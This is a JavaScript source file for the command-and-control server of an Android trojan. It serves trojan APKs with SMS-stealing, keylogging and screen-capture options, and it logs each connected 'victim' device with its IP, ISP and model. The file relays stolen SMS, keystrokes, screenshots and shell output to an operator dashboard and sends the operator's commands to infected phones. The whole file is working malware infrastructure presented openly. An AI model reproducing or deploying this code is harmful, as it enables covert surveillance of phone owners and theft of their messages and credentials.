import 'dotenv/config.js'

import express from "express";
import { Server } from "socket.io";
import bodyParser from 'body-parser';
import cors from 'cors'
import chalk from "chalk";
import { superBase } from "./modules/superBaseAPI.js";
import session from "express-session";
import FileStore from "session-file-store";
import crypto from "node:crypto";
import webRoute from "./routes/webRoutes.js";
import cryptoRoutes from "./routes/crypto.js";


// Clearing the database
await superBase.from("victims")
    .delete()
    .like("ID", "%")



// Variables
const File_Store = FileStore(session)
const portB = 4000
const portM = 4001
const ipB = "0.0.0.0"
const ipM = "0.0.0.0"
let adminSoc = null;
const activeVictims = new Map(); // deviceId -> socket
// Variables

// Express
const app = express()
app.use(cors())
app.use(session({
    store: new File_Store(),
    // secret: crypto.randomBytes(16).toString('hex'),
    secret: "abc",
    resave: false,
    cookie: { maxAge: 1000 * 60 * 60 * 24 },
    saveUninitialized: true
}))
app.use(bodyParser.urlencoded({ extended: true }))
app.use(bodyParser.json()) // Add JSON parser
app.use(express.static('static'))

// APK Generation Endpoint (before auth middleware)
app.post("/generate-apk", async (req, res) => {
    const { serverIp, features } = req.body;

    // Validate features
    const validFeatures = ['sms', 'keylogger', 'screen'];
    const selectedFeatures = features.filter(f => validFeatures.includes(f));

    if (selectedFeatures.length === 0) {
        return res.status(400).json({ error: 'At least one feature must be selected' });
    }

    // Validate server IP - allow empty for auto-detection
    // if (!serverIp || !/^[\d.]+$/.test(serverIp)) {
    //     return res.status(400).json({ error: 'Invalid server IP address' });
    // }

    console.log(chalk.green(`[APK Generator] Building APK with features: ${selectedFeatures.join(', ')}`));
    console.log(chalk.green(`[APK Generator] Server IP: ${serverIp}`));

    const fs = await import('fs');
    const path = await import('path');
    // Map feature combination to variant filename
    const sortedFeatures = selectedFeatures.sort();
    const featureStr = sortedFeatures.join('_');

    // Map to actual APK filename  
    const variantMap = {
        'sms': 'trojan_sms_v2.0.apk',
        'keylogger': 'trojan_keylogger_v2.0.apk',
        'screen': 'trojan_screen_v2.0.apk',
        'keylogger_sms': 'trojan_sms_keylogger_v2.0.apk',
        'screen_sms': 'trojan_sms_screen_v2.0.apk',
        'keylogger_screen': 'trojan_keylogger_screen_v2.0.apk',
        'keylogger_screen_sms': 'trojan_sms_keylogger_screen_v2.0.apk'
    };

    const filename = variantMap[featureStr] || `trojan_${featureStr}_v2.0.apk`;
    const apkPath = path.join(process.cwd(), 'output', filename);

    if (!fs.existsSync(apkPath)) {
        console.log(chalk.red(`[APK Generator] File not found: ${apkPath}`));
        return res.status(404).json({ error: `APK file not found: ${filename}` });
    }

    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Type', 'application/vnd.android.package-archive');

    const fileStream = fs.createReadStream(apkPath);
    fileStream.pipe(res);

    fileStream.on('end', () => {
        console.log(chalk.green(`[APK Generator] APK downloaded: ${filename}`));
    });
});

// Logout endpoint
app.post('/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            console.log(chalk.red('[Logout] Error destroying session:', err));
            return res.status(500).json({ error: 'Logout failed' });
        }
        res.clearCookie('connect.sid');
        res.json({ success: true });
    });
});

app.use('/', webRoute)
app.post("/login", async (req, res) => {
    var username = req.body.username
    var password = req.body.password

    var { data: data, error: err } = await superBase.from("activeuser")
        .select("name")
        .eq("username", username)
        .eq("password", password)
    if (!(err || data.length == 0)) {
        req.session.name = data[0].name
        res.send("ok")
    } else {
        res.send("error")
    }
})

app.post("/info", async (req, res) => {
    var { data: data, error: err } = await superBase.from("victims").select("*").eq("ID", req.body.id)
    if (!(err || data.length == 0)) {
        res.json(data[0])
        // Add device to active victims map
        const deviceSocket = botIo.sockets.sockets.get(req.body.id)
        if (deviceSocket) {
            activeVictims.set(req.body.id, deviceSocket)
        }
    }
})

app.post("/send", async (req, res) => {
    if (req.body.emit == "" || req.body.id == "") {
        res.status(400).send()
        return
    }

    if (req.body.emit == "ping") {
        botIo.emit("ping", req.body.args)
    } else {
        try {
            // Get specific device socket from activeVictims
            const targetSocket = activeVictims.get(req.body.id)
            if (targetSocket) {
                targetSocket.emit(req.body.emit, req.body.args)
            } else {
                res.status(404).send("Device not found")
                return
            }
        } catch (error) {
            // Clean up disconnected device
            await superBase.from("victims")
                .delete()
                .eq("ID", req.body.id)
            activeVictims.delete(req.body.id)
            getRemaining()
        }
    }
    res.status(200).send("Good")
})



const masterServer = app.listen(portM, ipM, () => {
    console.log(`Master Network listening on http://${ipM}:${portM}/`)
})


// Socket io Connection for BOTS
const botIo = new Server(portB)
console.log(`Bot Network listening on http://${ipB}:${portB}/`)

botIo.on("connection", async (socket) => {
    var data = JSON.parse(socket.handshake.query.info)

    const { error: insertError } = await superBase.from("victims")
        .insert([{
            "ID": socket.id,
            "Country": data.Country,
            "ISP": data.ISP,
            "IP": data.IP,
            "Brand": data.Brand,
            "Model": data.Model,
            "Manufacture": data.Manufacture
        }])

    console.log(chalk.green(`[+] Bot Connected (${socket.id}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))

    // Notify Dashboard
    if (adminSoc != null) {
        adminSoc.emit("logger", `[+] New Connection: ${data.Brand} ${data.Model} (${data.IP})`)
    }

    getRemaining()


    socket.on("disconnect", async () => {
        await superBase.from("victims")
            .delete()
            .eq("ID", socket.id)
        // Remove from active victims
        activeVictims.delete(socket.id)
        console.log(chalk.redBright(`[x] Bot Disconnected (${socket.id})`))
        getRemaining()
    })

    socket.on("logger", (data) => {
        if (adminSoc) adminSoc.emit("logger", { deviceId: socket.id, data })
    })

    socket.on("img", (data) => {
        if (adminSoc) adminSoc.emit("img", { deviceId: socket.id, imageData: data })
    })

    socket.on("sms", (data) => {
        if (adminSoc) adminSoc.emit("sms", { deviceId: socket.id, data })
    })

    socket.on("shellOut", (data) => {
        if (adminSoc) adminSoc.emit("shellOut", { deviceId: socket.id, output: data })
    })




})


// Socket io Connection for Master
const masterIo = new Server(masterServer);
masterIo.on("connection", (socket) => {
    if (adminSoc == null) {
        console.log(chalk.greenBright(`[+] Master got Connected (${socket.id})`))
        adminSoc = socket
        getRemaining()

        socket.on("disconnect", () => {
            console.log(chalk.red(`[x] Master got Disconnected (${socket.id})`))
            adminSoc = null
        })

        socket.on("mouse", (data) => {
            // Route mouse events to specific device
            const targetSocket = activeVictims.get(data.deviceId)
            if (targetSocket) {
                targetSocket.emit("mouse", data)
            }
        })

    } else {
        socket.disconnect()
    }
})


function getRemaining() {
    superBase.from("victims").select("ID,Brand,Model").limit(20)
        .then(({ data: data, error: err }) => {
            // console.log(data)
            if (!(err || data.length == 0 || adminSoc == null)) {
                adminSoc.emit("info", data)
            }
        })
}







// APK Generation Endpoint
app.post("/generate-apk", express.json(), async (req, res) => {
    const { serverIp, features } = req.body;

    // Validate features
    const validFeatures = ['sms', 'keylogger', 'screen'];
    const selectedFeatures = features.filter(f => validFeatures.includes(f));

    if (selectedFeatures.length === 0) {
        return res.status(400).json({ error: 'At least one feature must be selected' });
    }

    // Validate server IP
    if (!serverIp || !/^[\d.]+$/.test(serverIp)) {
        return res.status(400).json({ error: 'Invalid server IP address' });
    }

    console.log(chalk.green(`[APK Generator] Building APK with features: ${selectedFeatures.join(', ')}`));
    console.log(chalk.green(`[APK Generator] Server IP: ${serverIp}`));

    // For now, return the existing APK with a message
    // TODO: Implement actual build automation
    const fs = await import('fs');
    const path = await import('path');

    const apkPath = path.join(process.cwd(), 'notes.apk');

    if (!fs.existsSync(apkPath)) {
        return res.status(404).json({ error: 'APK file not found' });
    }

    // Generate descriptive filename
    const featureStr = selectedFeatures.join('_');
    const filename = `trojan_${featureStr}_v2.0.apk`;

    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Type', 'application/vnd.android.package-archive');

    const fileStream = fs.createReadStream(apkPath);
    fileStream.pipe(res);

    fileStream.on('end', () => {
        console.log(chalk.green(`[APK Generator] APK downloaded: ${filename}`));
    });
});
